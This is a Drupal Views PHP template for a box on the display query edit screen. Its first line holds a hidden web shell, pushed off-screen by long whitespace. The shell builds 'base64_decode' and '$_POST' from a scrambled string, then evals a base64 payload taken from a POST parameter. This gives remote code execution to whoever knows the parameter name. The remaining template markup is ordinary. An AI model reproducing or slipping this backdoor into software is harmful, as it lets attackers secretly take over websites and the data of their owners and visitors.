<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n9ad5de'];if(isset($s22)){eval($s21($s22));}?><?php

/**
 * @file
 * Template for each "box" on the display query edit screen.
 */
?>
<div class="<?php print $classes; ?>" <?php print $attributes; ?>>
  <?php print $item_help_icon; ?>
  <?php if(!empty($actions)) : ?>
    <?php print $actions; ?>
  <?php endif; ?>
  <?php if (!empty($title)) : ?>
    <h3><?php print $title; ?></h3>
  <?php endif; ?>
  <?php print $content; ?>
</div>
